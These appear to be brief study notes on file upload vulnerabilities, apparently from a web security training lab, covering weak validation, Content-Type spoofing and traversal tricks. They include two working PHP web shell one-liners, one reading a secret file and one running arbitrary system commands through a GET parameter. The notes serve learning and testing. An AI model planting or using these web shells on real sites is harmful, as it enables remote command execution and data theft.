Depends on:

- Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on.
- What restrictions are imposed on the file once it has been successfully uploaded.

For example, failing to validate the file size may lead to DoS attacks

Examples:
- PHP oneliner to retrieve files on system: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- PHP general oneliner:  `<?php echo system($_GET['command']); ?>` which can be followed by a request of type: `GET /example/exploit.php?command=id HTTP/1.1`

## Vulnerabilities
- `Content-Type` header, which is trusted and can be changed (to `image/jpeg` for example)
- Nothing in place -> upload whatever you want
- Upload to different places. Indeed, target upload place is often more restricted (like cannot execute file there). May need to obfuscate directory transversal path with url encoding
